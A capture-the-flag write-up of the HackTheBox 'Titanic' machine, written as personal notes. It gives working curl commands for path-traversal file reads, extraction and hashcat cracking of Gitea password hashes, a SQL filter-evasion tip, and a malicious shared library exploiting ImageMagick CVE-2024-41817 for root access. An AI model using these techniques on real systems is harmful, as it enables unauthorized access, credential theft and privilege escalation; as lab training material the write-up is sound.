
2025-03-19 22:57

Source: #htb #Boot2root 

rustscan shows port 80 and 22

add to `etc/hosts` 
```sh
echo "10.10.11.55 titanic.htb" | sudo tee -a /etc/hosts
```
### Enumeration

The website only has one button that is interactable i.e. validate trip. When we validate a trip, we download the ticket 

The request when captured on burp looks like 
```
GET /download?ticket=random-int.json HTTP/1.1
```
since the ticket reading functionality is not implemented securely, [[LFI]] we can replace the name of the ticket file with the one we want to read. For example `/etc/passwd` 

- we see a user named developer
- we can directly read the `user.txt` flag by replacing ticket parameters value to `/home/developer/user.txt`

since ssh key files aren't readable we read the `etc/hosts` and see a subdomain  - `dev.titanic.htb` - 
after adding this to our `etc/hosts` file and visiting the website we see This subdomain has `gitea` on it

browsing around in `gitea` we see an explore tab, it has 2 repos 
From the `docker-compose.yml` file we find out the path to the `gitea` directory

Searching on the web we find that the default config files of `gitea` are stored in `config/app.ini`

Pull out the default config via LFI

```sh
curl --path-as-is 'http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/conf/app.ini'
```

From the configure we find out the path to the database
```sh
curl -s "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" -o gitea.db
```

> [!NOTE]
> If in a CTF using UNION or SELECT is blocked then try using a different case for those words eg. Union Select. If a DB is vulnerable to SQLite injection you could use a known username eg.admin to drop table details using 

Open `gitea.db` in SQLite: 
```
sqlite3 gitea.db  
sqlite> .tables  
sqlite> SELECT lower_name, passwd, salt FROM user;
```

We retrieve a hashed password (and salt) for the `developer` user.

The hash can’t be directly cracked by [[Hashcat]],  convert it manually or use [gitea2hashcat.py](https://github.com/unix-ninja/hashcat/blob/master/tools/gitea2hashcat.py) script to format it:

```sh
hashcat -m 10900 gitea_hash.txt rockyou.txt
```
### Privesc

[[find]] directories w write perms
```sh
find /opt -writable -type d 2>/dev/null
```

A quick `sudo -l` check reveals no direct sudo privileges. Exploring `/opt`, we find a `scripts` folder containing `identify_images.sh`. Inspecting the file, we see it calls ImageMagick’s `identify` command on uploaded images.

find path to magick and version using 
```
$ which magick
/usr/bin/magick

$ /usr/bin/magick --version
Version: ImageMagick 7.1.1-35
```

There is a matching CVE-2024-41817 under this version that allows arbitrary code execution by loading malicious shared libraries into the current working directory when running `ImageMagick`: [Github](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)

From identify_images.sh we know that the directory we need is /opt/app/static/assets/images/. Let’s create a library that will copy the /root/root.txt file and change its permissions:

```sh
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /root/root.txt root.txt; chmod 754 root.txt");
    exit(0);
}
EOF
```

After a few seconds, a flag will appear in the directory
### References
https://app.hackthebox.com/machines/648
https://www.pentestnotes.ru/en/writeups/hackthebox/titanic-htb-writeup/